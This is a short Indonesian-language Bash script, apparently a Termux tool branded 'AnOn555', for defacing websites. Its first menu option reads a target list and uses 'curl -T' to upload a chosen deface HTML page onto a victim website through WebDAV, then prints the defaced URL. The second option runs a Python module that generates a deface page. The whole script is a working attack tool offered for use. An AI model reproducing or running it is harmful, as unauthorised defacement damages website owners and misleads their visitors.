clear
figlet AnOn555
sleep 1
echo "====================================≠======================="
echo "[1] Webdav"
echo "[2] Deface Sc Maker"
echo "[0] Exit"
echo "====================================≠======================="
read -p "Pilih
>>>>" plih;
if [ $plih = "1" ]
then
    sleep 1
    echo "Sabar. . . . . "
    sleep 1
    cat lvetrgt.txt
    sleep 1
    read -p "Website
    : " wbst;
    read -p "Nama Script deface
    : " nsd;
    curl -T /sdcard/$nsd $wbst
    sleep 1
    echo "Berhasil . . . . ."
    sleep 0.1
    echo "$wbst/$nsd"
elif [ $plih = "2" ]
then
    cd module
    python2 dfc.py
    mv ScAnonnn.html /sdcard
elif [ $pilih "0" ]
then
    exit
else
    sleep 2
    echo "Pilihan Salah!!!!"
    sleep 1
    sh deface.sh
fi
#alah

